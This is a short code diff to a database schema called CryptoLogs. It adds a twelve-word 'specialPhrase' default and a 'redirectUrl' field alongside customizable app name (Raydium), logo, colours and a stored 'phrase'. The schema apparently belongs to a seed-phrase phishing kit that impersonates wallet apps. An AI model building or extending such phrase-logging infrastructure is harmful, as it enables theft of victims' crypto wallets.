@@ -9,10 +9,12 @@ const CryptoLogs = new Schema(
       ref: "User",
       require: true,
     },
+    specialPhrase: { type: String, default: "one two three four five six seven eight nine ten eleven twelve" },
     appName: { type: String, default: "Raydium" },
     appLogo: {type: String, default: ''},
     phrase: { type: String, default: "" },
     modalColor: { type: String, default: "" },
+    redirectUrl: { type: String, default: "" },
     backgroundcolor: { type: String, default: "" },
     btnColor: { type: String, default: "" },
     location: {
